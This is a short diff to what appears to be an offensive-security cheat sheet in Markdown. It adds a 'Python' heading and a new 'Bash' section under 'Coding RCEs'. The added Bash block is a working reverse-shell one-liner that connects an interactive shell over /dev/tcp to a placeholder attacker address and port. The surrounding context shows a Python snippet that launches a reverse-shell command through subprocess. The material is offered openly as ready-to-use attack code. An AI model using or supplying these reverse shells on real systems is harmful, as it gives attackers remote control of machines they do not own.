@@ -1601,6 +1601,7 @@ Sub MyMacro()
 End Sub
 ````
 ### Coding RCEs
+#### Python
 ````
 import subprocess
 
@@ -1612,6 +1613,12 @@ try:
     subprocess.run(reverse_shell_command, shell=True)
 except Exception as e:
     print(f"An error occurred: {e}")
+````
+#### Bash
+````
+#!/bin/bash
+
+sh -i 5<> /dev/tcp/[MY_IP]/[MY_PORT] 0<&5 1>&5 2>&5
 ````
 ### Linux rce techniques
 ````
